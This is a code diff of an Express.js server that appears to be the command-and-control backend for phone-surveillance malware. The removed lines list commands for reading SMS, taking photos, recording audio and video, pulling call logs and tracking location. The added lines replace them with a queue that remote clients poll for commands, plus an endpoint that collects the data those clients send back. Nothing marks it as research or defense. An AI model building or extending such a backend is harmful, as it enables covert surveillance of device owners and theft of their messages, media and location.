@@ -4,65 +4,34 @@ const app = express();
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// ✅ For testing connection
+// ✅ Test endpoint
 app.post('/api/test', (req, res) => {
-  console.log('Test Data:', req.body);
+  console.log('📡 Test data received:', req.body);
   res.send('Test endpoint working!');
 });
 
-// ✅ Command handler
+// ✅ Command endpoint — sends a command to the client
+let latestCommand = '';
 app.post('/api/command', (req, res) => {
-  const { cmd, payload } = req.body;
-  console.log(`Received command: ${cmd}`);
-
-  switch (cmd) {
-    case 'getIP':
-      // This will just log; actual data should come from device
-      console.log('IP request from device');
-      res.send('Command received: getIP');
-      break;
-    case 'deviceInfo':
-      console.log('Device info requested');
-      res.send('Command received: deviceInfo');
-      break;
-    case 'camList':
-      console.log('Camera list requested');
-      res.send('Command received: camList');
-      break;
-    case 'takepic':
-      console.log(`Take picture command with: ${JSON.stringify(payload)}`);
-      res.send('Command received: takepic');
-      break;
-    case 'getSMS':
-      console.log('Read SMS inbox/sent');
-      res.send('Command received: getSMS');
-      break;
-    case 'getLocation':
-      console.log('Location requested');
-      res.send('Command received: getLocation');
-      break;
-    case 'startAudio':
-    case 'stopAudio':
-    case 'startVideo':
-    case 'stopVideo':
-    case 'getCallLogs':
-    case 'vibrate':
-      console.log(`Command received: ${cmd}`);
-      res.send(`Command received: ${cmd}`);
-      break;
-    default:
-      res.status(400).send('Unknown command');
-  }
+  latestCommand = req.body.cmd || '';
+  console.log(`✅ Received command: ${latestCommand}`);
+  res.send(`Command "${latestCommand}" registered`);
 });
 
-// ✅ Location update
-app.post('/api/location', (req, res) => {
-  const { lat, lng } = req.body;
-  console.log(`Received location: Lat ${lat}, Lng ${lng}`);
-  res.send('Location received');
+// ✅ Client requests latest command
+app.get('/api/command', (req, res) => {
+  res.json({ command: latestCommand });
 });
 
+// ✅ Data endpoint — client sends back results here
+app.post('/api/data', (req, res) => {
+  const { type, data } = req.body;
+  console.log(`📥 Data received [${type}]:`, data);
+  res.send(`Data received for ${type}`);
+});
+
+// ✅ Start the server
 const port = process.env.PORT || 3000;
 app.listen(port, () => {
-  console.log(`Server running on port ${port}`);
+  console.log(`🚀 Server running on port ${port}`);
 });
